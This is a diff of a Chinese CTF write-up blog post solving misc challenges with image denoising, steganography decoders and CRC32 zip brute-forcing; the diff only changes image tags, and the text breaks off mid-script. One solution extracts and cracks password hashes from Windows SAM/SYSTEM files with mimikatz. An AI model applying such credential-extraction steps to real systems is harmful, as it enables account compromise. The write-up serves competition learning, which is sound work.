-<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Time-and-chaos-1"><a href="#Time-and-chaos-1" class="headerlink" title="Time_and_chaos_1"></a><strong>Time_and_chaos_1</strong></h2><p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211449447.png" alt="image-20260311211449447"></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Time-and-chaos-1"><a href="#Time-and-chaos-1" class="headerlink" title="Time_and_chaos_1"></a><strong>Time_and_chaos_1</strong></h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211449447.png" alt="image-20260311211449447"></p>
 <p>这是赛后写的上图节选自公众号文章。首先看附件，是一些图片还有一个txt</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211648399.png" alt="image-20260311211648399"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211648399.png" alt="image-20260311211648399"></p>
 <p>零宽隐写</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211755627.png" alt="image-20260311211755627"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311211755627.png" alt="image-20260311211755627"></p>
 <p>这里是后半段flag，前半段应该来自那些图片，随波逐流分析查看lsb</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311212424612.png" alt="image-20260311212424612"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311212424612.png" alt="image-20260311212424612"></p>
 <p>可以看到右上角是由flag，但是这些图片上都有噪点，且都是同一底图，采用多帧降噪，单张肉眼几乎看不清主要是思路就是把给的附件都重叠在一起多张同底图叠加噪声后，噪声在像素上是随机分布的，而真实信号是固定的。对所有图片逐像素取<strong>均值 &#x2F; 中位数</strong>，噪声会被平均抵消，真实信号会逐渐显现。exp</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片列表（按顺序读取 1.png ~ 8.png）</span></span><br><span class="line">img_files = [<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取第一张图获取尺寸</span></span><br><span class="line">first_img = Image.<span class="built_in">open</span>(img_files[<span class="number">0</span>])</span><br><span class="line">width, height = first_img.size</span><br><span class="line">first_img.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化累加数组（用 float 避免溢出）</span></span><br><span class="line">sum_img = np.zeros((height, width, <span class="number">3</span>), dtype=np.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有图片，逐像素累加</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> img_files:</span><br><span class="line">    img = Image.<span class="built_in">open</span>(f).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    img_np = np.array(img, dtype=np.float32)</span><br><span class="line">    sum_img += img_np</span><br><span class="line">    img.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算均值（逐像素平均）</span></span><br><span class="line">mean_img = sum_img / <span class="built_in">len</span>(img_files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为 8 位图像（0-255）</span></span><br><span class="line">mean_img = np.clip(mean_img, <span class="number">0</span>, <span class="number">255</span>).astype(np.uint8)</span><br><span class="line">result = Image.fromarray(mean_img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存结果</span></span><br><span class="line">result.save(<span class="string">&quot;denoised_result.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;去噪完成，结果已保存为 denoised_result.png&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/denoised_result.png" alt="denoised_result"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/denoised_result.png" alt="denoised_result"></p>
 <p>这里就可以看到右上角的flag，不过还要再稍微处理一下反转一下</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/denoised_result-%E4%B8%8A%E4%B8%8B%E5%8F%8D%E8%BD%AC.png" alt="denoised_result-上下反转"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/denoised_result-%E4%B8%8A%E4%B8%8B%E5%8F%8D%E8%BD%AC.png" alt="denoised_result-上下反转"></p>
 <p>DASCTF{Logistic_and,拼一下最后的flag就是</p>
 <p>DASCTF{Logistic_and_time_fly}</p>
 <h2 id="SAM-and-Steg"><a href="#SAM-and-Steg" class="headerlink" title="SAM_and_Steg"></a>SAM_and_Steg</h2><p>给了sam和system文件，mimikatz分析一下</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175319698.png" alt="image-20260310175319698"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175319698.png" alt="image-20260310175319698"></p>
 <p>爆破一下hash</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175511707.png" alt="image-20260310175511707"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175511707.png" alt="image-20260310175511707"></p>
 <p>爆破出来是 !checkerboard1，010分析sam文件</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175648683.png" alt="image-20260310175648683"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310175648683.png" alt="image-20260310175648683"></p>
 <p>还有个密码是p@s4w0rd，foremost文件提取得到jpg文件</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/00024072.jpg" alt="00024072"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/00024072.jpg" alt="00024072"></p>
 <p>用 SilentEye提取出文件</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180117543.png" alt="image-20260310180117543"></p>
-<p>提取出AES256文件。<img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180233518.png" alt="image-20260310180233518"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180117543.png" alt="image-20260310180117543"></p>
+<p>提取出AES256文件。<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180233518.png" alt="image-20260310180233518"></p>
 <p> OpenSSL enc 格式密文用第二个密钥解密</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180427020.png" alt="image-20260310180427020"></p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180619435.png" alt="image-20260310180619435"></p>
-<p> 这是个Gzip 压缩文件，<img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180959171.png" alt="image-20260310180959171"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180427020.png" alt="image-20260310180427020"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180619435.png" alt="image-20260310180619435"></p>
+<p> 这是个Gzip 压缩文件，<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310180959171.png" alt="image-20260310180959171"></p>
 <h2 id="老妈的故事书"><a href="#老妈的故事书" class="headerlink" title="老妈的故事书"></a>老妈的故事书</h2><p>附件是一个pdf，还有一个加密文档，随波逐流分析pdf发现有个图片</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311215757413.png" alt="image-20260311215757413"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311215757413.png" alt="image-20260311215757413"></p>
 <p>​    图片没啥东西，在pdf发现信息</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311220206773.png" alt="image-20260311220206773">   </p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311220206773.png" alt="image-20260311220206773">   </p>
 <p>提示love是密码，后来尝试也可以直接爆破出来</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311215811234.png" alt="image-20260311215811234"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260311215811234.png" alt="image-20260311215811234"></p>
 <p>文档里是小红帽的故事，由简体，繁体联想道二进制，，，，俺是采集，赛后问写出来的大佬，他是直接喂给ai给出了思路，我也试试</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312105549417.png" alt="image-20260312105549417"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312105549417.png" alt="image-20260312105549417"></p>
 <p>直接将简体字繁体字对应到二进制是不对的，参考大佬脚本，原理是<strong>计数型繁简隐写</strong>。它的编码原理是：将繁体字作为分隔符，统计两个繁体字之间出现的简体字的个数。将每次统计得到的数字转换为 4 位二进制数（例如遇到 5 个简体字后出现 1 个繁体字，就转换为 <code>0101</code>），最后将这些 4 位二进制片段拼接，每 8 位还原为一个字符。exp</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zhconv</span><br><span class="line"><span class="keyword">import</span> docx</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_document_text</span>(<span class="params">file_path</span>):</span><br><span class="line">    doc = docx.Document(file_path)</span><br><span class="line">    text_content = []</span><br><span class="line">    <span class="keyword">for</span> para <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">        text_content.append(para.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(text_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_payload</span>(<span class="params">text</span>):</span><br><span class="line">    stream = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        simp = zhconv.convert(char, <span class="string">&quot;zh-hans&quot;</span>)</span><br><span class="line">        trad = zhconv.convert(char, <span class="string">&quot;zh-hant&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(simp) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(trad) == <span class="number">1</span> <span class="keyword">and</span> simp != trad:</span><br><span class="line">            <span class="keyword">if</span> char == simp:</span><br><span class="line">                stream.append(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> char == trad:</span><br><span class="line">                stream.append(<span class="number">1</span>)</span><br><span class="line">                </span><br><span class="line">    counts = []</span><br><span class="line">    zeros_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> stream:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="number">0</span>:</span><br><span class="line">            zeros_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            counts.append(zeros_count)</span><br><span class="line">            zeros_count = <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">    bin_str = <span class="string">&quot;&quot;</span>.join([<span class="built_in">format</span>(c, <span class="string">&quot;04b&quot;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> counts])</span><br><span class="line">    </span><br><span class="line">    result = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str) // <span class="number">8</span> * <span class="number">8</span>, <span class="number">8</span>):</span><br><span class="line">        result.append(<span class="built_in">int</span>(bin_str[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    text = get_document_text(<span class="string">&quot;flag.docx&quot;</span>)</span><br><span class="line">    raw_bytes = extract_payload(text)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(raw_bytes)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">rb&quot;[a-zA-Z0-9_]+?\&#123;.*?\&#125;&quot;</span>, raw_bytes)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nFlag:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">0</span>).decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312110946206.png" alt="image-20260312110946206"></p>
-<h2 id="generate-key"><a href="#generate-key" class="headerlink" title="generate_key"></a>generate_key</h2><h2 id><a href="#" class="headerlink" title></a><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/PixPin_2026-03-10_16-04-37.png"></h2><p>分析题目就是小明运行工具生成了一个key，分析内容镜像，这里使用lovelymem，看一下命令行</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190142279.png" alt="image-20260312190142279"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312110946206.png" alt="image-20260312110946206"></p>
+<h2 id="generate-key"><a href="#generate-key" class="headerlink" title="generate_key"></a>generate_key</h2><h2 id><a href="#" class="headerlink" title></a><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/PixPin_2026-03-10_16-04-37.png"></h2><p>分析题目就是小明运行工具生成了一个key，分析内容镜像，这里使用lovelymem，看一下命令行</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190142279.png" alt="image-20260312190142279"></p>
 <p>这个key.zip还有一个文件generate_key，这两个文件就是那个解题关键。文件扫描</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190514474.png" alt="image-20260312190514474"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190514474.png" alt="image-20260312190514474"></p>
 <p>导出这两个文件，导出后发现那个generate_key是一个压缩包</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190623638.png" alt="image-20260312190623638"></p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190715722.png" alt="image-20260312190715722"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190623638.png" alt="image-20260312190623638"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190715722.png" alt="image-20260312190715722"></p>
 <p>加密文件，然后密码在那个key.zip文件，打开分析附件，一共有16个压缩包，一眼crc32爆破</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190808555.png" alt="image-20260312190808555"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312190808555.png" alt="image-20260312190808555"></p>
 <p>由于爆破文件较多，这是使用脚本批量处理</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可自定义的字符集（根据题目可能是数字/字母/可见字符）</span></span><br><span class="line">CHARSET = string.digits + string.ascii_letters + string.punctuation + <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="comment"># 原始文件大小（从你截图里看到是 4 字节，可按需修改）</span></span><br><span class="line">FILE_SIZE = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_crc32</span>(<span class="params">crc32_expected: <span class="built_in">int</span>, length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    暴力破解指定长度和 CRC32 的字符串</span></span><br><span class="line"><span class="string">    :param crc32_expected: 目标 CRC32 值（无符号整数）</span></span><br><span class="line"><span class="string">    :param length: 原始字符串长度</span></span><br><span class="line"><span class="string">    :return: 匹配的字符串，未找到则返回 None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> chars <span class="keyword">in</span> product(CHARSET, repeat=length):</span><br><span class="line">        s = <span class="string">&quot;&quot;</span>.join(chars)</span><br><span class="line">        crc = zlib.crc32(s.encode()) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">if</span> crc == crc32_expected:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_zip</span>(<span class="params">zip_path: Path</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    处理单个 zip 文件，提取内部 txt 的 CRC32 并爆破</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="comment"># 假设 zip 内只有一个文件</span></span><br><span class="line">        info = zf.infolist()[<span class="number">0</span>]</span><br><span class="line">        crc32 = info.CRC</span><br><span class="line">        file_size = info.file_size</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 处理 <span class="subst">&#123;zip_path.name&#125;</span>: CRC32=0x<span class="subst">&#123;crc32:08x&#125;</span>, 大小=<span class="subst">&#123;file_size&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> crack_crc32(crc32, file_size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">batch_process</span>(<span class="params">start: <span 